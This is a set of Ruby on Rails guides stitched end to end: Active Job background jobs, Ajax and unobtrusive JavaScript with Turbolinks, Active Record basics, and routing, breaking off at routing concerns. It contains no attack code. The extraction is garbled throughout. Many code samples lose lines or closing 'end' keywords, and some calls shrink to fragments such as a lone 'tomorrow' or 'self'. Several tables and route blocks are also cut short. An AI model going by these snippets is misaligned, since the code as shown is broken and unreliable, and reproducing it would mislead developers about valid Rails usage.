Interpretation of the output of EXPLAIN is beyond the scope of this guide. 
The<n>following pointers may be helpful:
* SQLite3: [EXPLAIN QUERY PLAN](http://www.sqlite.org/eqp.html)
* MySQL: [EXPLAIN Output Format](http://dev.mysql.com/doc/refman/5.6/en/explain-output.html)
* PostgreSQL: [Using EXPLAIN](http://www.postgresql.org/docs/current/static/using-explain.html)
Active Job Basics
=================
This guide provides you with all you need to get started in creating,<n>enqueueing and executing background jobs.
* How to create jobs.
* How to enqueue jobs.
* How to run jobs in the background.
* How to send emails from your application async.
Active Job is a framework for declaring jobs and making them run on a variety<n>of queueing backends. 
These jobs can be everything from regularly scheduled<n>clean-ups, to billing charges, to mailings. 
Anything that can be chopped up<n>into small units of work and run in parallel, really.
-----------------------------
The main point is to ensure that all Rails apps will have a job infrastructure<n>in place, even if it's in the form of an "immediate runner". 
We can then have<n>framework features and other gems build on top of that, without having to<n>worry about API differences between various job runners such as Delayed Job<n>and Resque. 
Picking your queuing backend becomes more of an operational concern,<n>then. 
And you'll be able to switch between them without having to rewrite your jobs.
Creating a Job
This section will provide a step-by-step guide to creating a job and enqueuing it.
### Create the Job
Active Job provides a Rails generator to create jobs. 
$ bin/rails generate job guests_cleanup
create  app/jobs/guests_cleanup_job.rb
You can also create a job that will run on a specific queue:
$ bin/rails generate job guests_cleanup --queue urgent
If you don't want to use a generator, you could create your own file inside of<n>`app/jobs`, just make sure that it inherits from `ActiveJob::Base`.
Here's what a job looks like:
class GuestsCleanupJob < ActiveJob::Base
  queue_as :default
  def perform(*args)
    # Do something later
### Enqueue the Job
Enqueue a job like so:
tomorrow
That's it!
Job Execution
If no adapter is set, the job is immediately executed.
### Backends
Active Job has built-in adapters for multiple queueing backends (Sidekiq,<n>Resque, Delayed Job and others). 
To get an up-to-date list of the adapters<n>see the API Documentation for [ActiveJob::QueueAdapters](http://api.rubyonrails.org/classes/ActiveJob/QueueAdapters.html).
# config/application.rb
Queues
Most of the adapters support multiple queues. 
With Active Job you can schedule<n>the job to run on a specific queue:
  queue_as :low_priority
  #....
You can prefix the queue name for all your jobs using<n>`config.active_job.queue_name_prefix` in `application.rb`:
    config.active_job.queue_name_prefix = Rails.env
# app/jobs/guests_cleanup.rb
# Now your job will run on queue production_low_priority on your
# environment
MyJob.set(queue: :another_queue).perform_later(record)
class ProcessVideoJob < ActiveJob::Base
  queue_as do
    video = self.arguments.first
    if video.owner.premium?
      :premium_videojobs
    else
      :videojobs
  def perform(video)
    # do process video
ProcessVideoJob.perform_later(Video.last)
NOTE: Make sure your queueing backend "listens" on your queue name. 
For some<n>backends you need to specify the queues to listen to.
Callbacks
Active Job provides hooks during the lifecycle of a job. 
Callbacks allow you to<n>trigger logic during the lifecycle of a job.
### Available callbacks
* `before_enqueue`
* `around_enqueue`
* `after_enqueue`
* `before_perform`
* `around_perform`
* `after_perform`
### Usage
  before_enqueue do |job|
    # do something with the job instance
  around_perform do |job, block|
    # do something before perform
    block.call
    # do something after perform
Action Mailer
One of the most common jobs in a modern web application is sending emails outside<n>of the request-response cycle, so the user doesn't have to wait on it. 
Active Job<n>is integrated with Action Mailer so you can easily send emails asynchronously:
# If you want to send the email now use #deliver_now
UserMailer.welcome(@user).deliver_now
# If you want to send the email through Active Job use #deliver_later
UserMailer.welcome(@user).deliver_later
GlobalID
Active Job supports GlobalID for parameters. 
This makes it possible to pass live<n>Active Record objects to your job instead of class/id pairs, which you then have<n>to manually deserialize. 
Before, jobs would look like this:
class TrashableCleanupJob
  def perform(trashable_class, trashable_id, depth)
    trashable = trashable_class.constantize.find(trashable_id)
    trashable.cleanup(depth)
Now you can simply do:
  def perform(trashable, depth)
Active Model
Exceptions
Active Job provides a way to catch exceptions raised during the execution of the<n>job:
  rescue_from(ActiveRecord::RecordNotFound) do |exception|
   # do something with the exception
Working with JavaScript in Rails
================================
This guide covers the built-in Ajax/JavaScript functionality of Rails (and<n>more); it will enable you to create rich and dynamic Ajax applications with<n>ease!
* The basics of Ajax.
* Unobtrusive JavaScript.
* How Rails' built-in helpers assist you.
* How to handle Ajax on the server side.
* The Turbolinks gem.
-------------------------------------------------------------------------------
An Introduction to Ajax
------------------------
In order to understand Ajax, you must first understand what a web browser does<n>normally.
When you type `http://localhost:3000` into your browser's address bar and hit<n>'Go,' the browser (your 'client') makes a request to the server. 
It parses the<n>response, then fetches all associated assets, like JavaScript files,<n>stylesheets and images. 
It then assembles the page. 
If you click a link, it<n>does the same process: fetch the page, fetch the assets, put it all together,<n>show you the results. 
This is called the 'request response cycle.'
JavaScript can also make requests to the server, and parse the response. 
It<n>also has the ability to update information on the page. 
Combining these two<n>powers, a JavaScript writer can make a web page that can update just parts of<n>itself, without needing to get the full page data from the server. 
This is a<n>powerful technique that we call Ajax.
Rails ships with CoffeeScript by default, and so the rest of the examples<n>in this guide will be in CoffeeScript. 
All of these lessons, of course, apply<n>to vanilla JavaScript as well.
As an example, here's some CoffeeScript code that makes an Ajax request using<n>the jQuery library:
```coffeescript
$.ajax(url: "/test").done (html) ->
  $("#results").append html
This code fetches data from "/test", and then appends the result to the `div`<n>with an id of `results`.
Rails provides quite a bit of built-in support for building web pages with this<n>technique. 
You rarely have to write this code yourself. 
The rest of this guide<n>will show you how Rails can help you write websites in this way, but it's<n>all built on top of this fairly simple technique.
Unobtrusive JavaScript
-------------------------------------
Rails uses a technique called "Unobtrusive JavaScript" to handle attaching<n>JavaScript to the DOM. 
This is generally considered to be a best-practice<n>within the frontend community, but you may occasionally read tutorials that<n>demonstrate other ways.
Here's the simplest way to write JavaScript. 
You may see it referred to as<n>'inline JavaScript':
<a href="#" onclick="this.style.backgroundColor='#990000'">Paint it red</a>
When clicked, the link background will become red. 
Here's the problem: what<n>happens when we have lots of JavaScript we want to execute on a click?
<a href="#" onclick="this.style.backgroundColor='#009900';this.style.color='#FFFFFF';">Paint it green</a>
Awkward, right? 
We could pull the function definition out of the click handler,<n>and turn it into CoffeeScript:
paintIt = (element, backgroundColor, textColor) ->
  element.style.backgroundColor = backgroundColor
  if textColor?
    element.style.color = textColor
And then on our page:
<a href="#" onclick="paintIt(this, '#990000')">Paint it red</a>
That's a little bit better, but what about multiple links that have the same<n>effect?
<a href="#" onclick="paintIt(this, '#009900', '#FFFFFF')">Paint it green</a>
<a href="#" onclick="paintIt(this, '#000099', '#FFFFFF')">Paint it blue</a>
Not very DRY, eh? 
We can fix this by using events instead. 
We'll add a `data-*`<n>attribute to our link, and then bind a handler to the click event of every link<n>that has that attribute:
  $("a[data-background-color]").click (e) ->
    e.preventDefault()
    backgroundColor = $(this).data("background-color")
    textColor = $(this).data("text-color")
    paintIt(this, backgroundColor, textColor)
<a href="#" data-background-color="#009900" data-text-color="#FFFFFF">Paint it green</a>
<a href="#" data-background-color="#000099" data-text-color="#FFFFFF">Paint it blue</a>
We call this 'unobtrusive' JavaScript because we're no longer mixing our<n>JavaScript into our HTML. 
We've properly separated our concerns, making future<n>change easy. 
We can easily add behavior to any link by adding the data<n>attribute. 
We can run all of our JavaScript through a minimizer and<n>concatenator. 
We can serve our entire JavaScript bundle on every page, which<n>means that it'll get downloaded on the first page load and then be cached on<n>every page after that. 
Lots of little benefits really add up.
The Rails team strongly encourages you to write your CoffeeScript (and<n>JavaScript) in this style, and you can expect that many libraries will also<n>follow this pattern.
Built-in Helpers
Rails provides a bunch of view helper methods written in Ruby to assist you<n>in generating HTML. 
Sometimes, you want to add a little Ajax to those elements,<n>and Rails has got your back in those cases.
Because of Unobtrusive JavaScript, the Rails "Ajax helpers" are actually in two<n>parts: the JavaScript half and the Ruby half.
[rails.js](https://github.com/rails/jquery-ujs/blob/master/src/rails.js)<n>provides the JavaScript half, and the regular Ruby view helpers add appropriate<n>tags to your DOM. 
The CoffeeScript in rails.js then listens for these<n>attributes, and attaches appropriate handlers.
### form_for
[`form_for`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-form_for)<n>is a helper that assists with writing forms. 
`form_for` takes a `:remote`<n>option. 
```erb
<%= form_for(@article, remote: true) do |f| %>
  ...
<% end %>
This will generate the following HTML:
<form accept-charset="UTF-8" action="/articles" class="new_article" data-remote="true" id="new_article" method="post">
</form>
Note the `data-remote="true"`. 
Now, the form will be submitted by Ajax rather<n>than by the browser's normal submit mechanism.
You probably don't want to just sit there with a filled out `<form>`, though.<n>
You probably want to do something upon a successful submission. 
To do that,<n>bind to the `ajax:success` event. 
On failure, use `ajax:error`. 
Check it out:
$(document).ready ->
  $("#new_article").on("ajax:success", (e, data, status, xhr) ->
    $("#new_article").append xhr.responseText
  ).on "ajax:error", (e, xhr, status, error) ->
    $("#new_article").append "<p>ERROR</p>"
Obviously, you'll want to be a bit more sophisticated than that, but it's a<n>start. 
You can see more about the events [in the jquery-ujs wiki](https://github.com/rails/jquery-ujs/wiki/ajax).
### form_tag
[`form_tag`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-form_tag)<n>is very similar to `form_for`. 
It has a `:remote` option that you can use like<n>this:
<%= form_tag('/articles', remote: true) do %>
<form accept-charset="UTF-8" action="/articles" data-remote="true" method="post">
Everything else is the same as `form_for`. 
See its documentation for full<n>details.
### link_to
[`link_to`](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-link_to)<n>is a helper that assists with generating links. 
It has a `:remote` option you<n>can use like this:
<%= link_to "an article", @article, remote: true %>
which generates
<a href="/articles/1" data-remote="true">an article</a>
You can bind to the same Ajax events as `form_for`. 
Let's<n>assume that we have a list of articles that can be deleted with just one<n>click. 
We would generate some HTML like this:
<%= link_to "Delete article", @article, remote: true, method: :delete %>
and write some CoffeeScript like this:
  $("a[data-remote]").on "ajax:success", (e, data, status, xhr) ->
    alert "The article was deleted."
### button_to
[`button_to`](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-button_to) is a helper that helps you create buttons. 
It has a `:remote` option that you can call like this:
<%= button_to "An article", @article, remote: true %>
this generates
<form action="/articles/1" class="button_to" data-remote="true" method="post">
  <div><input type="submit" value="An article"></div>
Since it's just a `<form>`, all of the information on `form_for` also applies.
Server-Side Concerns
Ajax isn't just client-side, you also need to do some work on the server<n>side to support it. 
Often, people like their Ajax requests to return JSON<n>rather than HTML. 
Let's discuss what it takes to make that happen.
### A Simple Example
Imagine you have a series of users that you would like to display and provide a<n>form on that same page to create a new user. 
The index action of your<n>controller looks like this:
class UsersController < ApplicationController
  def index
    @users = User.all
    @user = User.new
The index view (`app/views/users/index.html.erb`) contains:
<b>Users</b>
<ul id="users">
<%= render @users %>
</ul>
<%= form_for(@user, remote: true) do |f| %>
  <%= f.label :name %><br>
  <%= f.text_field :name %>
  <%= f.submit %>
The `app/views/users/_user.html.erb` partial contains the following:
<li><%= user.name %></li>
The top portion of the index page displays the users. 
The bottom portion<n>provides a form to create a new user.
The bottom form will call the `create` action on the `UsersController`. 
Because<n>the form's remote option is set to true, the request will be posted to the<n>`UsersController` as an Ajax request, looking for JavaScript. 
this:
  # app/controllers/users_controller.rb
  # ......
  def create
    @user = User.new(params[:user])
    respond_to do |format|
      if @user.save
        format.html { redirect_to @user, notice: 'User was successfully created.' 
        format.js   {}
        format.json { render json: @user, status: :created, location: @user }
      else
        format.html { render action: "new" }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
Notice the format.js in the `respond_to` block; that allows the controller to<n>respond to your Ajax request. 
You then have a corresponding<n>`app/views/users/create.js.erb` view file that generates the actual JavaScript<n>code that will be sent and executed on the client side.
$("<%= escape_javascript(render @user) %>").appendTo("#users");
Turbolinks
Rails 4 ships with the [Turbolinks gem](https://github.com/rails/turbolinks).<n>
This gem uses Ajax to speed up page rendering in most applications.
### How Turbolinks Works
Turbolinks attaches a click handler to all `<a>` on the page. 
It<n>will then use PushState to change the URL to the correct one, preserving<n>refresh semantics and giving you pretty URLs.
The only thing you have to do to enable Turbolinks is have it in your Gemfile,<n>and put `//= require turbolinks` in your CoffeeScript manifest, which is usually<n>`app/assets/javascripts/application.js`.
If you want to disable Turbolinks for certain links, add a `data-no-turbolink`<n>attribute to the tag:
<a href="..." data-no-turbolink>No turbolinks here</a>.
### Page Change Events
When writing CoffeeScript, you'll often want to do some sort of processing upon<n>page load. 
With jQuery, you'd write something like this:
  alert "page has loaded!"
However, because Turbolinks overrides the normal page loading process, the<n>event that this relies on will not be fired. 
If you have code that looks like<n>this, you must change your code to do this instead:
$(document).on "page:change", ->
For more details, including other events you can bind to, check out [the<n>Turbolinks<n>README](https://github.com/rails/turbolinks/blob/master/README.md).
Other Resources
Here are some helpful links to help you learn even more:
* [jquery-ujs wiki](https://github.com/rails/jquery-ujs/wiki)
* [jquery-ujs list of external articles](https://github.com/rails/jquery-ujs/wiki/External-articles)
* [Rails 3 Remote Links and Forms: A Definitive Guide](http://www.alfajango.com/blog/rails-3-remote-links-and-forms/)
* [Railscasts: Unobtrusive JavaScript](http://railscasts.com/episodes/205-unobtrusive-javascript)
* [Railscasts: Turbolinks](http://railscasts.com/episodes/390-turbolinks)
Active Record Basics
====================
This guide is an introduction to Active Record.
* What Object Relational Mapping and Active Record are and how they are used in<n>  Rails.
* How Active Record fits into the Model-View-Controller paradigm.
* How to use Active Record models to manipulate data stored in a relational<n>  database.
* Active Record schema naming conventions.
* The concepts of database migrations, validations and callbacks.
What is Active Record?
Active Record is the M in [MVC](getting_started.html#the-mvc-architecture) - the<n>model - which is the layer of the system responsible for representing business<n>data and logic. 
Active Record facilitates the creation and use of business<n>objects whose data requires persistent storage to a database. 
It is an<n>implementation of the Active Record pattern which itself is a description of an<n>Object Relational Mapping system.
### The Active Record Pattern
[Active Record was described by Martin Fowler](http://www.martinfowler.com/eaaCatalog/activeRecord.html)<n>in his book _Patterns of Enterprise Application Architecture_. 
In<n>Active Record, objects carry both persistent data and behavior which<n>operates on that data. 
### Object Relational Mapping
Object-Relational Mapping, commonly referred to as its abbreviation ORM, is<n>a technique that connects the rich objects of an application to tables in<n>a relational database management system. 
Using ORM, the properties and<n>relationships of the objects in an application can be easily stored and<n>retrieved from a database without writing SQL statements directly and with less<n>overall database access code.
### Active Record as an ORM Framework
Active Record gives us several mechanisms, the most important being the ability<n>to:
* Represent models and their data.
* Represent associations between these models.
* Represent inheritance hierarchies through related models.
* Validate models before they get persisted to the database.
* Perform database operations in an object-oriented fashion.
Convention over Configuration in Active Record
When writing applications using other programming languages or frameworks, it<n>may be necessary to write a lot of configuration code. 
This is particularly true<n>for ORM frameworks in general. 
However, if you follow the conventions adopted by<n>Rails, you'll need to write very little configuration (in some case no<n>configuration at all) when creating Active Record models. 
The idea is that if<n>you configure your applications in the very same way most of the time then this<n>should be the default way. 
Thus, explicit configuration would be needed<n>only in those cases where you can't follow the standard convention.
### Naming Conventions
By default, Active Record uses some naming conventions to find out how the<n>mapping between models and database tables should be created. 
Rails will<n>pluralize your class names to find the respective database table. 
So, for<n>a class `Book`, you should have a database table called **books**. 
The Rails<n>pluralization mechanisms are very powerful, being capable to pluralize (and<n>singularize) both regular and irregular words. 
When using class names composed<n>of two or more words, the model class name should follow the Ruby conventions,<n>using the CamelCase form, while the table name must contain the words separated<n>by underscores. 
Examples:
* Database Table - Plural with underscores separating words (e.g., `book_clubs`).
* Model Class - Singular with the first letter of each word capitalized (e.g.,<n>`BookClub`).
| Model / Class    | Table / Schema |
| `LineItem`       | `line_items`   |
| `Deer`           | `deers`        |
| `Mouse`          | `mice`         |
| `Person`         | `people`       |
### Schema Conventions
Active Record uses naming conventions for the columns in database tables,<n>depending on the purpose of these columns.
* **Foreign keys** - These fields should be named following the pattern<n>  `singularized_table_name_id` (e.g., `item_id`, `order_id`). 
These are the<n>  fields that Active Record will look for when you create associations between<n>  your models.
* **Primary keys** - By default, Active Record will use an integer column named<n>  `id` as the table's primary key. 
When using [Active Record<n>  Migrations](migrations.html) to create your tables, this column will be<n>  automatically created.
There are also some optional column names that will add additional features<n>to Active Record instances:
* `created_at` - Automatically gets set to the current date and time when the<n>  record is first created.
* `updated_at` - Automatically gets set to the current date and time whenever<n>  the record is updated.
* `lock_version` - Adds [optimistic<n>  locking](http://api.rubyonrails.org/classes/ActiveRecord/Locking.html) to<n>  a model.
* `(association_name)_type` - Stores the type for<n>  [polymorphic associations](association_basics.html#polymorphic-associations).
* `(table_name)_count` - Used to cache the number of belonging objects on<n>  associations. 
NOTE: While these column names are optional, they are in fact reserved by Active Record. 
Steer clear of reserved keywords unless you want the extra functionality. 
For example, `type` is a reserved keyword used to designate a table using Single Table Inheritance (STI). 
If you are not using STI, try an analogous keyword like "context", that may still accurately describe the data you are modeling.
Creating Active Record Models
It is very easy to create Active Record models. 
All you have to do is to<n>subclass the `ActiveRecord::Base` class and you're good to go:
class Product < ActiveRecord::Base
This will create a `Product` model, mapped to a `products` table at the<n>database. 
By doing this you'll also have the ability to map the columns of each<n>row in that table with the attributes of the instances of your model. 
Suppose<n>that the `products` table was created using an SQL sentence like:
CREATE TABLE products (
   id int(11) NOT NULL auto_increment,
   name varchar(255),
   PRIMARY KEY  (id)
Following the table schema above, you would be able to write code like the<n>following:
p = Product.new
p.name = "Some Book"
puts p.name # "Some Book"
Overriding the Naming Conventions
What if you need to follow a different naming convention or need to use your<n>Rails application with a legacy database? 
No problem, you can easily override<n>the default conventions.
You can use the `ActiveRecord::Base.table_name=` method to specify the table<n>name that should be used:
  self
It's also possible to override the column that should be used as the table's<n>primary key using the `ActiveRecord::Base.primary_key=` method:
  self.primary_key = "product_id"
CRUD: Reading and Writing Data
------------------------------
CRUD is an acronym for the four verbs we use to operate on data: **C**reate,<n>**R**ead, **U**pdate and **D**elete. 
Active Record automatically creates methods<n>to allow an application to read and manipulate data stored within its tables.
### Create
Active Record objects can be created from a hash, a block or have their<n>attributes manually set after creation. 
The `new` method will return a new<n>object while `create` will return the object and save it to the database.
For example, given a model `User` with attributes of `name` and `occupation`,<n>the `create` method call will create and save a new record into the database:
user = User.create(name: "David", occupation: "Code Artist")
Using the `new` method, an object can be instantiated without being saved:
user = User.new
user.name = "David"
user.occupation = "Code Artist"
A call to `user.save` will commit the record to the database.
Finally, if a block is provided, both `create` and `new` will yield the new<n>object to that block for initialization:
user = User.new do |u|
  u.name = "David"
  u.occupation = "Code Artist"
### Read
Active Record provides a rich API for accessing data within a database. 
Below<n>are a few examples of different data access methods provided by Active Record.
# return a collection with all users
users = User.all
# return the first user
user = User.first
# return the first user named David
david = User.find_by(name: 'David')
# find all users named David who are Code Artists and sort by created_at in reverse chronological order
You can learn more about querying an Active Record model in the [Active Record<n>Query Interface](active_record_querying.html) guide.
### Update
Once an Active Record object has been retrieved, its attributes can be modified<n>and it can be saved to the database.
user = User.find_by(name: 'David')
user.name = 'Dave'
user.save
A shorthand for this is to use a hash mapping attribute names to the desired<n>value, like so:
user.update(name: 'Dave')
This is most useful when updating several attributes at once. 
If, on the other<n>hand, you'd like to update several records in bulk, you may find the<n>`update_all` class method useful:
User.update_all "max_login_attempts = 3, must_change_password = 'true'"
### Delete
Likewise, once retrieved an Active Record object can be destroyed which removes<n>it from the database.
user.destroy
Validations
-----------
Active Record allows you to validate the state of a model before it gets written<n>into the database. 
There are several methods that you can use to check your<n>models and validate that an attribute value is not empty, is unique and not<n>already in the database, follows a specific format and many more.
A quick example to illustrate:
  validates :name, presence: true
# => false
# => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
You can learn more about validations in the [Active Record Validations<n>guide](active_record_validations.html).
Active Record callbacks allow you to attach code to certain events in the<n>life-cycle of your models. 
This enables you to add behavior to your models by<n>transparently executing code when those events occur, like when you create a new<n>record, update it, destroy it and so on. 
You can learn more about callbacks in<n>the [Active Record Callbacks guide](active_record_callbacks.html).
Migrations
Rails provides a domain-specific language for managing a database schema called<n>migrations. 
Migrations are stored in files which are executed against any<n>database that Active Record supports using `rake`. 
Here's a migration that<n>creates a table:
class CreatePublications < ActiveRecord::Migration
  def change
    create_table :publications do |t|
      t.string :title
      t.text :description
      t.references :publication_type
      t.integer :publisher_id
      t.string :publisher_type
      t.boolean :single_issue
      t.timestamps
    add_index :publications, :publication_type_id
Rails keeps track of which files have been committed to the database and<n>provides rollback features. 
To actually create the table, you'd run `rake db:migrate`<n>and to roll it back, `rake db:rollback`.
Note that the above code is database-agnostic: it will run in MySQL,<n>PostgreSQL, Oracle and others. 
You can learn more about migrations in the<n>[Active Record Migrations guide](migrations.html).
Rails Routing from the Outside In
=================================
This guide covers the user-facing features of Rails routing.
* How to interpret the code in `routes.rb`.
* How to construct your own routes, using either the preferred resourceful style or the `match` method.
* What parameters to expect an action to receive.
* How to automatically create paths and URLs using route helpers.
* Advanced techniques such as constraints and Rack endpoints.
The Purpose of the Rails Router
-------------------------------
The Rails router recognizes URLs and dispatches them to a controller's action. 
It can also generate paths and URLs, avoiding the need to hardcode strings in your views.
### Connecting URLs to Code
When your Rails application receives an incoming request for:
GET /patients/17
it asks the router to match it to a controller action. 
If the first matching route is:
get '/patients/:id', to: 'patients#show'
the request is dispatched to the `patients` controller's `show` action with `{ id: '17' }` in `params`.
### Generating Paths and URLs from Code
You can also generate paths and URLs. 
If the route above is modified to be:
get '/patients/:id', to: 'patients#show', as: 'patient'
and your application contains this code in the controller:
@patient = Patient.find(17)
and this in the corresponding view:
<%= link_to 'Patient Record', patient_path(@patient) %>
then the router will generate the path `/patients/17`. 
This reduces the brittleness of your view and makes your code easier to understand. 
Note that the id does not need to be specified in the route helper.
Resource Routing: the Rails Default
-----------------------------------
Resource routing allows you to quickly declare all of the common routes for a given resourceful controller. 
Instead of declaring separate routes for your `index`, `show`, `new`, `edit`, `create`, `update` and `destroy` actions, a resourceful route declares them in a single line of code.
### Resources on the Web
Browsers request pages from Rails by making a request for a URL using a specific HTTP method, such as `GET`, `POST`, `PATCH`, `PUT` and `DELETE`. 
Each method is a request to perform an operation on the resource. 
A resource route maps a number of related requests to actions in a single controller.
DELETE /photos/17
resources :photos
Rails would dispatch that request to the `destroy` method on the `photos` controller with `{ id: '17' }` in `params`.
### CRUD, Verbs, and Actions
In Rails, a resourceful route provides a mapping between HTTP verbs and URLs to controller actions. 
By convention, each action also maps to particular CRUD operations in a database. 
A single entry in the routing file, such as:
creates seven different routes in your application, all mapping to the `Photos` controller:
| HTTP Verb | Path             | Controller#Action | Used for                                     |
| --------- | ---------------- | ----------------- | -------------------------------------------- |
| GET       | /photos          | photos#index      | display a list of all photos                 |
| GET       | /photos/new      | photos#new        | return an HTML form for creating a new photo |
| POST      | /photos          | photos#create     | create a new photo                           |
| GET       | /photos/:id      | photos#show       | display a specific photo                     |
| GET       | /photos/:id/edit | photos#edit       | return an HTML form for editing a photo      |
| PATCH/PUT | /photos/:id      | photos#update     | update a specific photo                      |
| DELETE    | /photos/:id      | photos#destroy    | delete a specific photo                      |
NOTE: Because the router uses the HTTP verb and URL to match inbound requests, four URLs map to seven different actions.
NOTE: Rails routes are matched in the order they are specified, so if you have a `resources :photos` above a `get 'photos/poll'` the `show` action's route for the `resources` line will be matched before the `get` line. 
To fix this, move the `get` line **above** the `resources` line so that it is matched first.
### Path and URL Helpers
Creating a resourceful route will also expose a number of helpers to the controllers in your application. 
In the case of `resources :photos`:
* `photos_path` returns `/photos`
* `new_photo_path` returns `/photos/new`
* `edit_photo_path(:id)` returns `/photos/:id/edit` (for instance, `edit_photo_path(10)` returns `/photos/10/edit`)
* `photo_path(:id)` returns `/photos/:id` (for instance, `photo_path(10)` returns `/photos/10`)
Each of these helpers has a corresponding `_url` helper (such as `photos_url`) which returns the same path prefixed with the current host, port and path prefix.
### Defining Multiple Resources at the Same Time
If you need to create routes for more than one resource, you can save a bit of typing by defining them all with a single call to `resources`:
resources :photos, :books, :videos
This works exactly the same as:
resources :books
resources :videos
### Singular Resources
Sometimes, you have a resource that clients always look up without referencing an ID. 
For example, you would like `/profile` to always show the profile of the currently logged in user. 
In this case, you can use a singular resource to map `/profile` (rather than `/profile/:id`) to the `show` action:
get 'profile', to: 'users#show'
Passing a `String` to `get` will expect a `controller#action` format, while passing a `Symbol` will map directly to an action:
get 'profile', to: :show
This resourceful route:
resource :geocoder
creates six different routes in your application, all mapping to the `Geocoders` controller:
| HTTP Verb | Path           | Controller#Action | Used for                                      |
| --------- | -------------- | ----------------- | --------------------------------------------- |
| GET       | /geocoder/new  | geocoders#new     | return an HTML form for creating the geocoder |
| POST      | /geocoder      | geocoders#create  | create the new geocoder                       |
| GET       | /geocoder      | geocoders#show    | display the one and only geocoder resource    |
| GET       | /geocoder/edit | geocoders#edit    | return an HTML form for editing the geocoder  |
| PATCH/PUT | /geocoder      | geocoders#update  | update the one and only geocoder resource     |
| DELETE    | /geocoder      | geocoders#destroy | delete the geocoder resource                  |
NOTE: Because you might want to use the same controller for a singular route (`/account`) and a plural route (`/accounts/45`), singular resources map to plural controllers. 
So that, for example, `resource :photo` and `resources :photos` creates both singular and plural routes that map to the same controller (`PhotosController`).
A singular resourceful route generates these helpers:
* `new_geocoder_path` returns `/geocoder/new`
* `edit_geocoder_path` returns `/geocoder/edit`
* `geocoder_path` returns `/geocoder`
As with plural resources, the same helpers ending in `_url` will also include the host, port and path prefix.
WARNING: A [long-standing bug](https://github.com/rails/rails/issues/1769) prevents `form_for` from working automatically with singular resources. 
As a workaround, specify the URL for the form directly, like so:
form_for @geocoder, url: geocoder_path do |f|
### Controller Namespaces and Routing
You may wish to organize groups of controllers under a namespace. 
Most commonly, you might group a number of administrative controllers under an `Admin::` namespace. 
You would place these controllers under the `app/controllers/admin` directory, and you can group them together in your router:
namespace :admin do
| HTTP Verb | Path                     | Controller#Action      | Named Helper              |
scope module: 'admin' do
or, for a single case:
scope '/admin' do
In each of these cases, the named routes remain the same as if you did not use `scope`. 
| HTTP Verb | Path                     | Controller#Action    | Named Helper           |
TIP: _If you need to use a different controller namespace inside a `namespace` block you can specify an absolute controller path, e.g: `get '/foo' => '/foo#index'`._
### Nested Resources
It's common to have resources that are logically children of other resources. 
For example, suppose your application includes these models:
class Magazine < ActiveRecord::Base
  has_many :ads
class Ad < ActiveRecord::Base
  belongs_to :magazine
Nested routes allow you to capture this relationship in your routing. 
In this case, you could include this route declaration:
resources :magazines do
  resources :ads
In addition to the routes for magazines, this declaration will also route ads to an `AdsController`. 
The ad URLs require a magazine:
| HTTP Verb | Path                                 | Controller#Action | Used for                                                                   |
| --------- | ------------------------------------ | ----------------- | -------------------------------------------------------------------------- |
| GET       | /magazines/:magazine_id/ads          | ads#index         | display a list of all ads for a specific magazine                          |
| GET       | /magazines/:magazine_id/ads/new      | ads#new           | return an HTML form for creating a new ad belonging to a specific magazine |
| POST      | /magazines/:magazine_id/ads          | ads#create        | create a new ad belonging to a specific magazine                           |
| GET       | /magazines/:magazine_id/ads/:id      | ads#show          | display a specific ad belonging to a specific magazine                     |
| GET       | /magazines/:magazine_id/ads/:id/edit | ads#edit          | return an HTML form for editing an ad belonging to a specific magazine     |
| PATCH/PUT | /magazines/:magazine_id/ads/:id      | ads#update        | update a specific ad belonging to a specific magazine                      |
| DELETE    | /magazines/:magazine_id/ads/:id      | ads#destroy       | delete a specific ad belonging to a specific magazine                      |
This will also create routing helpers such as `magazine_ads_url` and `edit_magazine_ad_path`. 
These helpers take an instance of Magazine as the first parameter (`magazine_ads_url(@magazine)`).
#### Limits to Nesting
You can nest resources within other nested resources if you like. 
For example:
resources :publishers do
  resources :magazines do
    resources :photos
Deeply-nested resources quickly become cumbersome. 
In this case, for example, the application would recognize paths such as:
/publishers/1/magazines/2/photos/3
The corresponding route helper would be `publisher_magazine_photo_url`, requiring you to specify objects at all three levels. 
Indeed, this situation is confusing enough that a popular [article](http://weblog.jamisbuck.org/2007/2/5/nesting-resources) by Jamis Buck proposes a rule of thumb for good Rails design:
TIP: _Resources should never be nested more than 1 level deep._
#### Shallow Nesting
One way to avoid deep nesting (as recommended above) is to generate the collection actions scoped under the parent, so as to get a sense of the hierarchy, but to not nest the member actions. 
In other words, to only build routes with the minimal amount of information to uniquely identify the resource, like this:
  resources :comments, only: [:index, :new, :create]
resources :comments, only: [:show, :edit, :update, :destroy]
This idea strikes a balance between descriptive routes and deep nesting. 
There exists shorthand syntax to achieve just that, via the `:shallow` option:
  resources :comments, shallow: true
This will generate the exact same routes as the first example. 
You can also specify the `:shallow` option in the parent resource, in which case all of the nested resources will be shallow:
  resources :comments
  resources :quotes
  resources :drafts
The `shallow` method of the DSL creates a scope inside of which every nesting is shallow. 
This generates the same routes as the previous example:
shallow do
    resources :comments
    resources :quotes
    resources :drafts
There exist two options for `scope` to customize shallow routes. 
`:shallow_path` prefixes member paths with the specified parameter:
scope shallow_path: "sekret" do
    resources :comments, shallow: true
The comments resource here will have the following routes generated for it:
| HTTP Verb | Path                                         | Controller#Action | Named Helper             |
--------------------------------------------
-----------------
| GET       | /sekret/comments/:id/edit(.:format)          | comments#edit     | edit_comment_path        |
| GET       | /sekret/comments/:id(.:format)               | comments#show     | comment_path             |
| PATCH/PUT | /sekret/comments/:id(.:format)               | comments#update   | comment_path             |
| DELETE    | /sekret/comments/:id(.:format)               | comments#destroy  | comment_path             |
The `:shallow_prefix` option adds the specified parameter to the named helpers:
scope shallow_prefix: "sekret" do
| HTTP Verb | Path                                         | Controller#Action | Named Helper                |
| GET       | /comments/:id/edit(.:format)                 | comments#edit     | edit_sekret_comment_path    |
| GET       | /comments/:id(.:format)                      | comments#show     | sekret_comment_path         |
| PATCH/PUT | /comments/:id(.:format)                      | comments#update   | sekret_comment_path         |
| DELETE    | /comments/:id(.:format)                      | comments#destroy  | sekret_comment_path         |
### Routing concerns
Routing Concerns allows you to declare common routes that can be reused inside other resources and routes. 
To define a concern:
concern :commentable do
concern :image_attachable do
  resources :images, only: :index
